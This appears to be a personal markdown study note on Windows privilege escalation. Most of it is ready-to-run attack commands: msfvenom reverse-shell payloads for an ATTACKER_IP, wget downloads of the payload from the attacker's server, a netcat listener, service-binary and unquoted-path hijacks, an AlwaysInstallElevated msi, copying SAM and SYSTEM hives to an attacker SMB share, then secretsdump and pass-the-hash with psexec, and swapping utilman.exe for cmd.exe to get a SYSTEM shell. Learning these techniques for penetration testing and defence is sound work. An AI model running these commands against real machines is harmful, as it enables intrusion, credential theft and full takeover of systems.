Notes about privilege escalation on [[Windows]].

## Windows Privileges

Run `whois /priv` to view current user's privileges.

A full list of privileges can be found [here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).

A list of privilege exploits can be found [here](https://github.com/gtworek/Priv2Admin).

## Scheduled Tasks

[[Windows/Enumeration#Scheduled Tasks]]

Check scheduled tasks. Can you overwrite the executable being ran?

## Services

[[Windows/Enumeration#Windows Services]]

Check services. Can you overwrite the service executable?

Generate reverse shell payload on attacking computer:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f exe-service -o payload.exe
```

Run server on attacking computer (defaults to port `8000`):

```bash
python3 -m http.server
```

Download payload on target computer:

```powershell
wget http://ATTACKER_IP:8000/payload.exe -O payload.exe
```

Replace server executable with malicious payload:

```powershell
move payload.exe C:\target\location\service-name.exe
```

Grant permission to executable:

```powershell
icacls C:\target\location\service-name.exe /grant Everyone:F
```

Set up reverse listener on attacking computer:

```bash
nc -lvnp ATTACKER_PORT
```

Wait for service to run on target computer, or try to force restart if you have privileges:

```powershell
sc.exe stop <service-name>
sc.exe start <service-name>
```

Note: Use `sc.exe` in PowerShell or `sc` in Command Prompt.

## Unquoted service paths

[[Windows/Enumeration#Windows Services]]

Run `sc.exe qc <servicename`.

Check if the `BINARY_PATH_NAME` is missing quotes and spaces in path/filename, i.e. `C:\path\to\file name.exe` instead of `"C:\path\to\file name.exe"`. 

If the path has spaces and it is unquoted, you can exploit this. In this example, the service till try to find `file.exe` before it tries to find `file name.exe`, therefore you can put a malicious `file.exe` in the same folder.

## Insecure service permissions

Download [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) to check service permissions. Run `accesschk64.exe -qlc <servicename>`. Check for `SERVICE_ALL_ACCESS` permission, which means you can rewrite service configurations.

Get a malicious executable on the server.

Reconfigure the service to run the executable file:

```powershell
sc.exe config <servicename> binPath= "C:\path\to\malicious\file.exe" obj= LocalSystem
```

Wait for service to run on target computer, or try to force restart if you have privileges:

```powershell
sc.exe stop <servicename>
sc.exe start <service-name>
```

Note: Use `sc.exe` in PowerShell or `sc` in Command Prompt.

## AlwaysInstallElevated

[[Windows/Enumeration#AlwaysInstallElevated]]

Check if `AlwaysInstallElevated` is enabled.

Generate a malicious `.msi` on attacking computer, e.g. using `msvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f msi -o malicious.msi
```

Transfer the malicious `.msi`.

Execute on the target computer:

```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

## SeBackupPrivilege / SeRestorePrivilege

[[Windows/Enumeration#SeBackupPrivilege / SeRestorePrivilege]]

Run `whoami /priv` and check for `SeBackupPrivilege` and `SeRestorePrivilege`.

On the target computer, backup SAM and System hashes:

```
reg save hklm\system C:\Users\User\system.hive
reg save hklm\sam C:\Users\User\sam.hive
```

On the attacking computer, use [impacket](https://www.kali.org/tools/impacket/) to set up a SAM server.

```bash
# Create a new directory
mkdir share

# Start the SAM server using same credentials as the target Windows user
python /opt/impacket/examples/smbserver.py -smb2support -username User -password password123 public share
```

On the target computer, copy the files to the attacking computer:

```
copy C:\Users\User\sam.hive \\ATTACKER_IP\public\
copy C:\Users\User\system.hive \\ATTACKER_IP\public\
```

On the attacking computer, use impacket to retrieve hashes:

```bash
python /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

Check for Administrator's hash, i.e.

```
Administrator:500:HASH_PART_1:HASH_PART_2:::
```

Use Pass-the-Hash attack on Administrator's hashed password:

```shell
python /opt/impacket/examples/psexec.py -hashes HASH_PART_1:HASH_PART_2 administrator@TARGET_IP
```


## SeTakeOwnershipPrivilege

[[Windows/Enumeration#SeTakeOwnershipPrivilege]]

Run `whoami /priv` and check for `SeTakeOwnershipPrivilege`.

Take ownership of a application running with `SYSTEM` privileges, e.g. `utilman.exe` (built in accessibility application).

Take ownership of `utilman.exe`:

```
takeown /f C:\Windows\System32\Utilman.exe
```

Give the current user full permissions:

```
icacls C:\Windows\System32\Utilman.exe /grant User:F
```

Replace `utilman.exe` with `cmd.exe`:

```
cd C:\Windows\System32\
copy cmd.exe utilman.exe
```

Trigger `utilman.exe` (`cmd.exe`):

1. Start menu -> User profile -> Lock
2. On the lock screen, click 'Ease of Access'.
3. A command prompt should open with `SYSTEM` privileges.

## SeImpersonatePrivilege/ SeAssignPrimaryTokenPrivilege

[[Windows/Enumeration#SeImpersonatePrivilege/ SeAssignPrimaryTokenPrivilege]]

## Resources

-   [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
-   [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
-   [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
-   [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
-   [Decoder's Blog](https://decoder.cloud/)
-   [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
-   [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

## Related

- [[Windows]]
- [[Windows/Enumeration]]